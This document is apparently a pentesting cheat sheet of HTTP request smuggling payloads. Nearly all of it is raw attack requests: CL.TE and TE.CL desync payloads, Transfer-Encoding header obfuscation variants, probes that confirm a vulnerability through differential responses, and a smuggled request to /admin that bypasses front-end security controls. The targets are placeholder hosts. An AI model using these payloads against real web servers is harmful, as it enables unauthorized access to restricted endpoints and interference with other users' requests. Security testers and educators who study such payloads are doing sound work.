# HTTP Request Smuggling Payloads

## CL.TE Payload
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

## TE.CL Payload
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

## Obfuscate TE header
```http
Transfer-Encoding: xchunked
```

```http
Transfer-Encoding: chunked
```

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
```

```http
Transfer-Encoding:[tab]chunked
```

```http
[space]Transfer-Encoding: chunked
```

```http
X: X[\n]Transfer-Encoding: chunked
```

```http
Transfer-Encoding
: chunked
```

## Confirming CL.TE vulnerabilities using differential responses
```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

## Confirming TE.CL vulnerabilities using differential responses
```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0


```

## Using HTTP request smuggling to bypass front-end security controls
```http
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```